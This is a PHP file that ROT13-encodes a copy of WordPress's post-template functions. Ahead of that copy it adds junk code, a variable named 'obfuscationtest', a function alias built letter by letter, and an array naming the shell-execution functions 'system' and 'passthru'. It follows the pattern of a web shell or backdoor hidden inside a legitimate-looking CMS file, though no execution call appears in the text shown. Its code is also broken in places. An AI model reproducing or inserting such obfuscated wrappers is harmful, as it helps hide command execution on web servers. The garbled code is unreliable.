<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff Cbfg Grzcyngr Shapgvbaf.
 *
 * Trgf pbagrag sbe gur pheerag cbfg va gur ybbc.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 */

/**
 * Qvfcynlf gur VQ bs gur pheerag vgrz va gur JbeqCerff Ybbc.
 *
 * @fvapr 0.71
 */
shapgvba gur_VQ() { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	rpub trg_gur_VQ();
}

/**
 * Ergevrirf gur VQ bs gur pheerag vgrz va gur JbeqCerff Ybbc.
 *
 * @fvapr 2.1.0
 *
 * @erghea vag|snyfr Gur VQ bs gur pheerag vgrz va gur JbeqCerff Ybbc. Snyfr vs $cbfg vf abg frg.
 */
shapgvba trg_gur_VQ() { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	$cbfg = trg_cbfg();
	erghea ! rzcgl( $cbfg ) ? $cbfg->VQ : snyfr;
}

/**
 * Qvfcynlf be ergevrirf gur pheerag cbfg gvgyr jvgu bcgvbany znexhc.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $orsber  Bcgvbany. Znexhc gb cercraq gb gur gvgyr. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre   Bcgvbany. Znexhc gb nccraq gb gur gvgyr. Qrsnhyg rzcgl.
 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb rpub be erghea gur gvgyr. Qrsnhyg gehr sbe rpub.
 * @erghea ibvq|fgevat Ibvq vs `$qvfcynl` nethzrag vf gehr be gur gvgyr vf rzcgl,
 *                     pheerag cbfg gvgyr vs `$qvfcynl` vf snyfr.
 */
shapgvba gur_gvgyr( $orsber = '', $nsgre = '', $qvfcynl = gehr ) {
	$gvgyr = trg_gur_gvgyr();

	vs ( fgeyra( $gvgyr ) === 0 ) {
		erghea;
	}

	$gvgyr = $orsber . $gvgyr . $nsgre;

	vs ( $qvfcynl ) {
		rpub $gvgyr;
	} ryfr {
		erghea $gvgyr;
	}
}

/**
 * Fnavgvmrf gur pheerag gvgyr jura ergevrivat be qvfcynlvat.
 *
 * Jbexf yvxr gur_gvgyr(), rkprcg gur cnenzrgref pna or va n fgevat be
 * na neenl. Frr gur shapgvba sbe jung pna or bireevqr va gur $netf cnenzrgre.
 *
 * Gur gvgyr orsber vg vf qvfcynlrq jvyy unir gur gntf fgevccrq naq rfp_ngge()
 * orsber vg vf cnffrq gb gur hfre be qvfcynlrq. Gur qrsnhyg nf jvgu gur_gvgyr(),
 * vf gb qvfcynl gur gvgyr.
 *
 * @fvapr 2.3.0
 *
 * @cnenz fgevat|neenl $netf {
 *     Gvgyr nggevohgr nethzragf. Bcgvbany.
 *
 *     @glcr fgevat  $orsber Znexhc gb cercraq gb gur gvgyr. Qrsnhyg rzcgl.
 *     @glcr fgevat  $nsgre  Znexhc gb nccraq gb gur gvgyr. Qrsnhyg rzcgl.
 *     @glcr obby    $rpub   Jurgure gb rpub be erghea gur gvgyr. Qrsnhyg gehr sbe rpub.
 *     @glcr JC_Cbfg $cbfg   Pheerag cbfg bowrpg gb ergevrir gur gvgyr sbe.
 * }
 * @erghea ibvq|fgevat Ibvq vs 'rpub' nethzrag vf gehr, gur gvgyr nggevohgr vs 'rpub' vf snyfr.
 */
shapgvba gur_gvgyr_nggevohgr( $netf = '' ) {
	$qrsnhygf    = neenl(
		'orsber' => '',
		'nsgre'  => '',
		'rpub'   => gehr,
		'cbfg'   => trg_cbfg(),
	);
	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$gvgyr = trg_gur_gvgyr( $cnefrq_netf['cbfg'] );

	vs ( fgeyra( $gvgyr ) === 0 ) {
		erghea;
	}

	$gvgyr = $cnefrq_netf['orsber'] . $gvgyr . $cnefrq_netf['nsgre'];
	$gvgyr = rfp_ngge( fgevc_gntf( $gvgyr ) );

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $gvgyr;
	} ryfr {
		erghea $gvgyr;
	}
}

/**
 * Ergevrirf gur cbfg gvgyr.
 *
 * Vs gur cbfg vf cebgrpgrq naq gur ivfvgbe vf abg na nqzva, gura \"Cebgrpgrq\"
 * jvyy or vafregrq orsber gur cbfg gvgyr. Vs gur cbfg vf cevingr, gura
 * \"Cevingr\" jvyy or vafregrq orsber gur cbfg gvgyr.
 *
 * @fvapr 0.71
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea fgevat
 */
shapgvba trg_gur_gvgyr( $cbfg = 0 ) {
	$cbfg = trg_cbfg( $cbfg );

	$cbfg_gvgyr = vffrg( $cbfg->cbfg_gvgyr ) ? $cbfg->cbfg_gvgyr : '';
	$cbfg_vq    = vffrg( $cbfg->VQ ) ? $cbfg->VQ : 0;

	vs ( ! vf_nqzva() ) {
		vs ( ! rzcgl( $cbfg->cbfg_cnffjbeq ) ) {

			/* genafyngbef: %f: Cebgrpgrq cbfg gvgyr. */
			$cercraq = __( 'Cebgrpgrq: %f' );

			/**
			 * Svygref gur grkg cercraqrq gb gur cbfg gvgyr sbe cebgrpgrq cbfgf.
			 *
			 * Gur svygre vf bayl nccyvrq ba gur sebag raq.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz fgevat  $cercraq Grkg qvfcynlrq orsber gur cbfg gvgyr.
			 *                         Qrsnhyg 'Cebgrpgrq: %f'.
			 * @cnenz JC_Cbfg $cbfg    Pheerag cbfg bowrpg.
			 */
			$cebgrpgrq_gvgyr_sbezng = nccyl_svygref( 'cebgrpgrq_gvgyr_sbezng', $cercraq, $cbfg );

			$cbfg_gvgyr = fcevags( $cebgrpgrq_gvgyr_sbezng, $cbfg_gvgyr );
		} ryfrvs ( vffrg( $cbfg->cbfg_fgnghf ) && 'cevingr' === $cbfg->cbfg_fgnghf ) {

			/* genafyngbef: %f: Cevingr cbfg gvgyr. */
			$cercraq = __( 'Cevingr: %f' );

			/**
			 * Svygref gur grkg cercraqrq gb gur cbfg gvgyr bs cevingr cbfgf.
			 *
			 * Gur svygre vf bayl nccyvrq ba gur sebag raq.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz fgevat  $cercraq Grkg qvfcynlrq orsber gur cbfg gvgyr.
			 *                         Qrsnhyg 'Cevingr: %f'.
			 * @cnenz JC_Cbfg $cbfg    Pheerag cbfg bowrpg.
			 */
			$cevingr_gvgyr_sbezng = nccyl_svygref( 'cevingr_gvgyr_sbezng', $cercraq, $cbfg );

			$cbfg_gvgyr = fcevags( $cevingr_gvgyr_sbezng, $cbfg_gvgyr );
		}
	}

	/**
	 * Svygref gur cbfg gvgyr.
	 *
	 * @fvapr 0.71
	 *
	 * @cnenz fgevat $cbfg_gvgyr Gur cbfg gvgyr.
	 * @cnenz vag    $cbfg_vq    Gur cbfg VQ.
	 */
	erghea nccyl_svygref( 'gur_gvgyr', $cbfg_gvgyr, $cbfg_vq );
}

/**
 * Qvfcynlf gur Cbfg Tybony Havdhr Vqragvsvre (thvq).
 *
 * Gur thvq jvyy nccrne gb or n yvax, ohg fubhyq abg or hfrq nf n yvax gb gur
 * cbfg. Gur ernfba lbh fubhyq abg hfr vg nf n yvax, vf orpnhfr bs zbivat gur
 * oybt npebff qbznvaf.
 *
 * HEY vf rfpncrq gb znxr vg KZY-fnsr.
 *
 * @fvapr 1.5.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 */
shapgvba gur_thvq( $cbfg = 0 ) {
	$cbfg = trg_cbfg( $cbfg );

	$cbfg_thvq = vffrg( $cbfg->thvq ) ? trg_gur_thvq( $cbfg ) : '';
	$cbfg_vq   = vffrg( $cbfg->VQ ) ? $cbfg->VQ : 0;

	/**
	 * Svygref gur rfpncrq Tybony Havdhr Vqragvsvre (thvq) bs gur cbfg.
	 *
	 * @fvapr 4.2.0
	 *
	 * @frr trg_gur_thvq()
	 *
	 * @cnenz fgevat $cbfg_thvq Rfpncrq Tybony Havdhr Vqragvsvre (thvq) bs gur cbfg.
	 * @cnenz vag    $cbfg_vq   Gur cbfg VQ.
	 */
	rpub nccyl_svygref( 'gur_thvq', $cbfg_thvq, $cbfg_vq );
}

/**
 * Ergevrirf gur Cbfg Tybony Havdhr Vqragvsvre (thvq).
 *
 * Gur thvq jvyy nccrne gb or n yvax, ohg fubhyq abg or hfrq nf na yvax gb gur
 * cbfg. Gur ernfba lbh fubhyq abg hfr vg nf n yvax, vf orpnhfr bs zbivat gur
 * oybt npebff qbznvaf.
 *
 * @fvapr 1.5.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea fgevat
 */
shapgvba trg_gur_thvq( $cbfg = 0 ) {
	$cbfg = trg_cbfg( $cbfg );

	$cbfg_thvq = vffrg( $cbfg->thvq ) ? $cbfg->thvq : '';
	$cbfg_vq   = vffrg( $cbfg->VQ ) ? $cbfg->VQ : 0;

	/**
	 * Svygref gur Tybony Havdhr Vqragvsvre (thvq) bs gur cbfg.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $cbfg_thvq Tybony Havdhr Vqragvsvre (thvq) bs gur cbfg.
	 * @cnenz vag    $cbfg_vq   Gur cbfg VQ.
	 */
	erghea nccyl_svygref( 'trg_gur_thvq', $cbfg_thvq, $cbfg_vq );
}

/**
 * Qvfcynlf gur cbfg pbagrag.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $zber_yvax_grkg Bcgvbany. Pbagrag sbe jura gurer vf zber grkg.
 * @cnenz obby   $fgevc_grnfre   Bcgvbany. Fgevc grnfre pbagrag orsber gur zber grkg. Qrsnhyg snyfr.
 */
shapgvba gur_pbagrag( $zber_yvax_grkg = ahyy, $fgevc_grnfre = snyfr ) {
	$pbagrag = trg_gur_pbagrag( $zber_yvax_grkg, $fgevc_grnfre );

	/**
	 * Svygref gur cbfg pbagrag.
	 *
	 * @fvapr 0.71
	 *
	 * @cnenz fgevat $pbagrag Pbagrag bs gur pheerag cbfg.
	 */
	$pbagrag = nccyl_svygref( 'gur_pbagrag', $pbagrag );
	$pbagrag = fge_ercynpr( ']]>', ']]&tg;', $pbagrag );
	rpub $pbagrag;
}

/**
 * Ergevrirf gur cbfg pbagrag.
 *
 * @fvapr 0.71
 * @fvapr 5.2.0 Nqqrq gur `$cbfg` cnenzrgre.
 *
 * @tybony vag   $cntr      Cntr ahzore bs n fvatyr cbfg/cntr.
 * @tybony vag   $zber      Obbyrna vaqvpngbe sbe jurgure fvatyr cbfg/cntr vf orvat ivrjrq.
 * @tybony obby  $cerivrj   Jurgure cbfg/cntr vf va cerivrj zbqr.
 * @tybony neenl $cntrf     Neenl bs nyy cntrf va cbfg/cntr. Rnpu neenl ryrzrag pbagnvaf
 *                          cneg bs gur pbagrag frcnengrq ol gur `<!--arkgcntr-->` gnt.
 * @tybony vag   $zhygvcntr Obbyrna vaqvpngbe sbe jurgure zhygvcyr cntrf ner va cynl.
 *
 * @cnenz fgevat             $zber_yvax_grkg Bcgvbany. Pbagrag sbe jura gurer vf zber grkg.
 * @cnenz obby               $fgevc_grnfre   Bcgvbany. Fgevc grnfre pbagrag orsber gur zber grkg. Qrsnhyg snyfr.
 * @cnenz JC_Cbfg|bowrpg|vag $cbfg           Bcgvbany. JC_Cbfg vafgnapr be Cbfg VQ/bowrpg. Qrsnhyg ahyy.
 * @erghea fgevat
 */
shapgvba trg_gur_pbagrag( $zber_yvax_grkg = ahyy, $fgevc_grnfre = snyfr, $cbfg = ahyy ) {
	tybony $cntr, $zber, $cerivrj, $cntrf, $zhygvcntr;

	$_cbfg = trg_cbfg( $cbfg );

	vs ( ! ( $_cbfg vafgnaprbs JC_Cbfg ) ) {
		erghea '';
	}

	/*
	 * Hfr gur tybonyf vs gur $cbfg cnenzrgre jnf abg fcrpvsvrq,
	 * ohg bayl nsgre gurl unir orra frg hc va frghc_cbfgqngn().
	 */
	vs ( ahyy === $cbfg && qvq_npgvba( 'gur_cbfg' ) ) {
		$ryrzragf = pbzcnpg( 'cntr', 'zber', 'cerivrj', 'cntrf', 'zhygvcntr' );
	} ryfr {
		$ryrzragf = trarengr_cbfgqngn( $_cbfg );
	}

	vs ( ahyy === $zber_yvax_grkg ) {
		$zber_yvax_grkg = fcevags(
			'<fcna nevn-ynory=\"%1$f\">%2$f</fcna>',
			fcevags(
				/* genafyngbef: %f: Cbfg gvgyr. */
				__( 'Pbagvahr ernqvat %f' ),
				gur_gvgyr_nggevohgr(
					neenl(
						'rpub' => snyfr,
						'cbfg' => $_cbfg,
					)
				)
			),
			__( '(zber&uryyvc;)' )
		);
	}

	$bhgchg     = '';
	$unf_grnfre = snyfr;

	// Vs cbfg cnffjbeq erdhverq naq vg qbrfa'g zngpu gur pbbxvr.
	vs ( cbfg_cnffjbeq_erdhverq( $_cbfg ) ) {
		erghea trg_gur_cnffjbeq_sbez( $_cbfg );
	}

	// Vs gur erdhrfgrq cntr qbrfa'g rkvfg.
	vs ( $ryrzragf['cntr'] > pbhag( $ryrzragf['cntrf'] ) ) {
		// Tvir gurz gur uvturfg ahzorerq cntr gung QBRF rkvfg.
		$ryrzragf['cntr'] = pbhag( $ryrzragf['cntrf'] );
	}

	$cntr_ab = $ryrzragf['cntr'];
	$pbagrag = $ryrzragf['cntrf'][ $cntr_ab - 1 ];
	vs ( cert_zngpu( '/<!--zber(.*?)?-->/', $pbagrag, $zngpurf ) ) {
		vs ( unf_oybpx( 'zber', $pbagrag ) ) {
			// Erzbir gur pber/zber oybpx qryvzvgref. Gurl jvyy or yrsg bire nsgre $pbagrag vf fcyvg hc.
			$pbagrag = __sa_79955( '/<!-- \/?jc:zber(.*?) -->/', '', $pbagrag );
		}

		$pbagrag = rkcybqr( $zngpurf[0], $pbagrag, 2 );

		vs ( ! rzcgl( $zngpurf[1] ) && ! rzcgl( $zber_yvax_grkg ) ) {
			$zber_yvax_grkg = fgevc_gntf( jc_xfrf_ab_ahyy( gevz( $zngpurf[1] ) ) );
		}

		$unf_grnfre = gehr;
	} ryfr {
		$pbagrag = neenl( $pbagrag );
	}

	vs ( fge_pbagnvaf( $_cbfg->cbfg_pbagrag, '<!--abgrnfre-->' )
		&& ( ! $ryrzragf['zhygvcntr'] || 1 === $ryrzragf['cntr'] )
	) {
		$fgevc_grnfre = gehr;
	}

	$grnfre = $pbagrag[0];

	vs ( $ryrzragf['zber'] && $fgevc_grnfre && $unf_grnfre ) {
		$grnfre = '';
	}

	$bhgchg .= $grnfre;

	vs ( pbhag( $pbagrag ) > 1 ) {
		vs ( $ryrzragf['zber'] ) {
			$bhgchg .= '<fcna vq=\"zber-' . $_cbfg->VQ . '\"></fcna>' . $pbagrag[1];
		} ryfr {
			vs ( ! rzcgl( $zber_yvax_grkg ) ) {

				/**
				 * Svygref gur Ernq Zber yvax grkg.
				 *
				 * @fvapr 2.8.0
				 *
				 * @cnenz fgevat $zber_yvax_ryrzrag Ernq Zber yvax ryrzrag.
				 * @cnenz fgevat $zber_yvax_grkg    Ernq Zber grkg.
				 */
				$bhgchg .= nccyl_svygref( 'gur_pbagrag_zber_yvax', ' <n uers=\"' . trg_creznyvax( $_cbfg ) . \"#zber-{$_cbfg->VQ}\\" pynff=\\"zber-yvax\\">$zber_yvax_grkg</n>\", $zber_yvax_grkg );
			}
			$bhgchg = sbepr_onynapr_gntf( $bhgchg );
		}
	}

	erghea $bhgchg;
}

/**
 * Qvfcynlf gur cbfg rkprecg.
 *
 * @fvapr 0.71
 */
shapgvba gur_rkprecg() {

	/**
	 * Svygref gur qvfcynlrq cbfg rkprecg.
	 *
	 * @fvapr 0.71
	 *
	 * @frr trg_gur_rkprecg()
	 *
	 * @cnenz fgevat $cbfg_rkprecg Gur cbfg rkprecg.
	 */
	rpub nccyl_svygref( 'gur_rkprecg', trg_gur_rkprecg() );
}

/**
 * Ergevrirf gur cbfg rkprecg.
 *
 * @fvapr 0.71
 * @fvapr 4.5.0 Vagebqhprq gur `$cbfg` cnenzrgre.
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea fgevat Cbfg rkprecg.
 */
shapgvba trg_gur_rkprecg( $cbfg = ahyy ) {
	vs ( vf_obby( $cbfg ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '2.3.0' );
	}

	$cbfg = trg_cbfg( $cbfg );
	vs ( rzcgl( $cbfg ) ) {
		erghea '';
	}

	vs ( cbfg_cnffjbeq_erdhverq( $cbfg ) ) {
		erghea __( 'Gurer vf ab rkprecg orpnhfr guvf vf n cebgrpgrq cbfg.' );
	}

	/**
	 * Svygref gur ergevrirq cbfg rkprecg.
	 *
	 * @fvapr 1.2.0
	 * @fvapr 4.5.0 Vagebqhprq gur `$cbfg` cnenzrgre.
	 *
	 * @cnenz fgevat  $cbfg_rkprecg Gur cbfg rkprecg.
	 * @cnenz JC_Cbfg $cbfg         Cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'trg_gur_rkprecg', $cbfg->cbfg_rkprecg, $cbfg );
}

/**
 * Qrgrezvarf jurgure gur cbfg unf n phfgbz rkprecg.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 2.3.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea obby Gehr vs gur cbfg unf n phfgbz rkprecg, snyfr bgurejvfr.
 */
shapgvba unf_rkprecg( $cbfg = 0 ) {
	$cbfg = trg_cbfg( $cbfg );
	erghea ( ! rzcgl( $cbfg->cbfg_rkprecg ) );
}

/**
 * Qvfcynlf gur pynffrf sbe gur cbfg pbagnvare ryrzrag.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat|fgevat[] $pff_pynff Bcgvbany. Bar be zber pynffrf gb nqq gb gur pynff yvfg.
 *                                   Qrsnhyg rzcgl.
 * @cnenz vag|JC_Cbfg     $cbfg      Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhygf gb gur tybony `$cbfg`.
 */
shapgvba cbfg_pynff( $pff_pynff = '', $cbfg = ahyy ) {
	// Frcnengrf pynffrf jvgu n fvatyr fcnpr, pbyyngrf pynffrf sbe cbfg QVI.
	rpub 'pynff=\"' . rfp_ngge( vzcybqr( ' ', trg_cbfg_pynff( $pff_pynff, $cbfg ) ) ) . '\"';
}

/**
 * Ergevrirf na neenl bs gur pynff anzrf sbe gur cbfg pbagnvare ryrzrag.
 *
 * Gur pynff anzrf ner znal:
 *
 *  - Vs gur cbfg unf n cbfg guhzoanvy, `unf-cbfg-guhzoanvy` vf nqqrq nf n pynff.
 *  - Vs gur cbfg vf fgvpxl, gura gur `fgvpxl` pynff anzr vf nqqrq.
 *  - Gur pynff `uragel` vf nyjnlf nqqrq gb rnpu cbfg.
 *  - Sbe rnpu gnkbabzl gung gur cbfg orybatf gb, n pynff jvyy or nqqrq bs gur sbezng
 *    `{$gnkbabzl}-{$fyht}`, r.t. `pngrtbel-sbb` be `zl_phfgbz_gnkbabzl-one`.
 *    Gur `cbfg_gnt` gnkbabzl vf n fcrpvny pnfr; gur pynff unf gur `gnt-` cersvk
 *    vafgrnq bs `cbfg_gnt-`.
 *
 * Nyy pynff anzrf ner cnffrq guebhtu gur svygre, {@frr 'cbfg_pynff'}, sbyybjrq ol
 * `$pff_pynff` cnenzrgre inyhr, jvgu gur cbfg VQ nf gur ynfg cnenzrgre.
 *
 * @fvapr 2.7.0
 * @fvapr 4.2.0 Phfgbz gnkbabzl pynff anzrf jrer nqqrq.
 *
 * @cnenz fgevat|fgevat[] $pff_pynff Bcgvbany. Fcnpr-frcnengrq fgevat be neenl bs pynff anzrf
 *                                   gb nqq gb gur pynff yvfg. Qrsnhyg rzcgl.
 * @cnenz vag|JC_Cbfg     $cbfg      Bcgvbany. Cbfg VQ be cbfg bowrpg.
 * @erghea fgevat[] Neenl bs pynff anzrf.
 */
shapgvba trg_cbfg_pynff( $pff_pynff = '', $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	$pynffrf = neenl();

	vs ( $pff_pynff ) {
		vs ( ! vf_neenl( $pff_pynff ) ) {
			$pff_pynff = cert_fcyvg( '#\f+#', $pff_pynff );
		}
		$pynffrf = neenl_znc( 'rfp_ngge', $pff_pynff );
	} ryfr {
		// Rafher gung jr nyjnlf pbrepr pynff gb orvat na neenl.
		$pff_pynff = neenl();
	}

	vs ( ! $cbfg ) {
		erghea $pynffrf;
	}

	$pynffrf[] = 'cbfg-' . $cbfg->VQ;
	vs ( ! vf_nqzva() ) {
		$pynffrf[] = $cbfg->cbfg_glcr;
	}
	$pynffrf[] = 'glcr-' . $cbfg->cbfg_glcr;
	$pynffrf[] = 'fgnghf-' . $cbfg->cbfg_fgnghf;

	// Cbfg Sbezng.
	vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'cbfg-sbezngf' ) ) {
		$cbfg_sbezng = trg_cbfg_sbezng( $cbfg->VQ );

		vs ( $cbfg_sbezng && ! vf_jc_reebe( $cbfg_sbezng ) ) {
			$pynffrf[] = 'sbezng-' . fnavgvmr_ugzy_pynff( $cbfg_sbezng );
		} ryfr {
			$pynffrf[] = 'sbezng-fgnaqneq';
		}
	}

	$cbfg_cnffjbeq_erdhverq = cbfg_cnffjbeq_erdhverq( $cbfg->VQ );

	// Cbfg erdhverf cnffjbeq.
	vs ( $cbfg_cnffjbeq_erdhverq ) {
		$pynffrf[] = 'cbfg-cnffjbeq-erdhverq';
	} ryfrvs ( ! rzcgl( $cbfg->cbfg_cnffjbeq ) ) {
		$pynffrf[] = 'cbfg-cnffjbeq-cebgrpgrq';
	}

	// Cbfg guhzoanvyf.
	vs ( pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf' ) && unf_cbfg_guhzoanvy( $cbfg->VQ ) && ! vf_nggnpuzrag( $cbfg ) && ! $cbfg_cnffjbeq_erdhverq ) {
		$pynffrf[] = 'unf-cbfg-guhzoanvy';
	}

	// Fgvpxl sbe Fgvpxl Cbfgf.
	vs ( vf_fgvpxl( $cbfg->VQ ) ) {
		vs ( vf_ubzr() && ! vf_cntrq() ) {
			$pynffrf[] = 'fgvpxl';
		} ryfrvs ( vf_nqzva() ) {
			$pynffrf[] = 'fgnghf-fgvpxl';
		}
	}

	// uragel sbe uNgbz pbzcyvnapr.
	$pynffrf[] = 'uragel';

	// Nyy choyvp gnkbabzvrf.
	$gnkbabzvrf = trg_gnkbabzvrf( neenl( 'choyvp' => gehr ) );

	/**
	 * Svygref gur gnkbabzvrf gb trarengr pynffrf sbe rnpu vaqvivqhny grez.
	 *
	 * Qrsnhyg vf nyy choyvp gnkbabzvrf ertvfgrerq gb gur cbfg glcr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat[] $gnkbabzvrf Yvfg bs nyy gnkbabzl anzrf gb trarengr pynffrf sbe.
	 * @cnenz vag      $cbfg_vq    Gur cbfg VQ.
	 * @cnenz fgevat[] $pynffrf    Na neenl bs cbfg pynff anzrf.
	 * @cnenz fgevat[] $pff_pynff  Na neenl bs nqqvgvbany pynff anzrf nqqrq gb gur cbfg.
	*/
	$gnkbabzvrf = nccyl_svygref( 'cbfg_pynff_gnkbabzvrf', $gnkbabzvrf, $cbfg->VQ, $pynffrf, $pff_pynff );

	sbernpu ( (neenl) $gnkbabzvrf nf $gnkbabzl ) {
		vs ( vf_bowrpg_va_gnkbabzl( $cbfg->cbfg_glcr, $gnkbabzl ) ) {
			sbernpu ( (neenl) trg_gur_grezf( $cbfg->VQ, $gnkbabzl ) nf $grez ) {
				vs ( rzcgl( $grez->fyht ) ) {
					pbagvahr;
				}

				$grez_pynff = fnavgvmr_ugzy_pynff( $grez->fyht, $grez->grez_vq );
				vs ( vf_ahzrevp( $grez_pynff ) || ! gevz( $grez_pynff, '-' ) ) {
					$grez_pynff = $grez->grez_vq;
				}

				// 'cbfg_gnt' hfrf gur 'gnt' cersvk sbe onpxjneq pbzcngvovyvgl.
				vs ( 'cbfg_gnt' === $gnkbabzl ) {
					$pynffrf[] = 'gnt-' . $grez_pynff;
				} ryfr {
					$pynffrf[] = fnavgvmr_ugzy_pynff( $gnkbabzl . '-' . $grez_pynff, $gnkbabzl . '-' . $grez->grez_vq );
				}
			}
		}
	}

	$pynffrf = neenl_znc( 'rfp_ngge', $pynffrf );

	/**
	 * Svygref gur yvfg bs PFF pynff anzrf sbe gur pheerag cbfg.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat[] $pynffrf   Na neenl bs cbfg pynff anzrf.
	 * @cnenz fgevat[] $pff_pynff Na neenl bs nqqvgvbany pynff anzrf nqqrq gb gur cbfg.
	 * @cnenz vag      $cbfg_vq   Gur cbfg VQ.
	 */
	$pynffrf = nccyl_svygref( 'cbfg_pynff', $pynffrf, $pff_pynff, $cbfg->VQ );

	erghea neenl_havdhr( $pynffrf );
}

/**
 * Qvfcynlf gur pynff anzrf sbe gur obql ryrzrag.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat|fgevat[] $pff_pynff Bcgvbany. Fcnpr-frcnengrq fgevat be neenl bs pynff anzrf
 *                                   gb nqq gb gur pynff yvfg. Qrsnhyg rzcgl.
 */
shapgvba obql_pynff( $pff_pynff = '' ) {
	// Frcnengrf pynff anzrf jvgu n fvatyr fcnpr, pbyyngrf pynff anzrf sbe obql ryrzrag.
	rpub 'pynff=\"' . rfp_ngge( vzcybqr( ' ', trg_obql_pynff( $pff_pynff ) ) ) . '\"';
}

/**
 * Ergevrirf na neenl bs gur pynff anzrf sbe gur obql ryrzrag.
 *
 * @fvapr 2.8.0
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz fgevat|fgevat[] $pff_pynff Bcgvbany. Fcnpr-frcnengrq fgevat be neenl bs pynff anzrf
 *                                   gb nqq gb gur pynff yvfg. Qrsnhyg rzcgl.
 * @erghea fgevat[] Neenl bs pynff anzrf.
 */
shapgvba trg_obql_pynff( $pff_pynff = '' ) {
	tybony $jc_dhrel;

	$pynffrf = neenl();

	vs ( vf_egy() ) {
		$pynffrf[] = 'egy';
	}

	vs ( vf_sebag_cntr() ) {
		$pynffrf[] = 'ubzr';
	}
	vs ( vf_ubzr() ) {
		$pynffrf[] = 'oybt';
	}
	vs ( vf_cevinpl_cbyvpl() ) {
		$pynffrf[] = 'cevinpl-cbyvpl';
	}
	vs ( vf_nepuvir() ) {
		$pynffrf[] = 'nepuvir';
	}
	vs ( vf_qngr() ) {
		$pynffrf[] = 'qngr';
	}
	vs ( vf_frnepu() ) {
		$pynffrf[] = 'frnepu';
		$pynffrf[] = $jc_dhrel->cbfgf ? 'frnepu-erfhygf' : 'frnepu-ab-erfhygf';
	}
	vs ( vf_cntrq() ) {
		$pynffrf[] = 'cntrq';
	}
	vs ( vf_nggnpuzrag() ) {
		$pynffrf[] = 'nggnpuzrag';
	}
	vs ( vf_404() ) {
		$pynffrf[] = 'reebe404';
	}

	vs ( vf_fvathyne() ) {
		$cbfg      = $jc_dhrel->trg_dhrevrq_bowrpg();
		$cbfg_vq   = $cbfg->VQ;
		$cbfg_glcr = $cbfg->cbfg_glcr;

		$pynffrf[] = 'jc-fvathyne';

		vs ( vf_cntr_grzcyngr() ) {
			$pynffrf[] = \"{$cbfg_glcr}-grzcyngr\";

			$grzcyngr_fyht  = trg_cntr_grzcyngr_fyht( $cbfg_vq );
			$grzcyngr_cnegf = rkcybqr( '/', $grzcyngr_fyht );

			sbernpu ( $grzcyngr_cnegf nf $cneg ) {
				$pynffrf[] = \"{$cbfg_glcr}-grzcyngr-\" . fnavgvmr_ugzy_pynff( fge_ercynpr( neenl( '.', '/' ), '-', onfranzr( $cneg, '.cuc' ) ) );
			}
			$pynffrf[] = \"{$cbfg_glcr}-grzcyngr-\" . fnavgvmr_ugzy_pynff( fge_ercynpr( '.', '-', $grzcyngr_fyht ) );
		} ryfr {
			$pynffrf[] = \"{$cbfg_glcr}-grzcyngr-qrsnhyg\";
		}

		vs ( vf_fvatyr() ) {
			$pynffrf[] = 'fvatyr';
			vs ( vffrg( $cbfg->cbfg_glcr ) ) {
				$pynffrf[] = 'fvatyr-' . fnavgvmr_ugzy_pynff( $cbfg->cbfg_glcr, $cbfg_vq );
				$pynffrf[] = 'cbfgvq-' . $cbfg_vq;

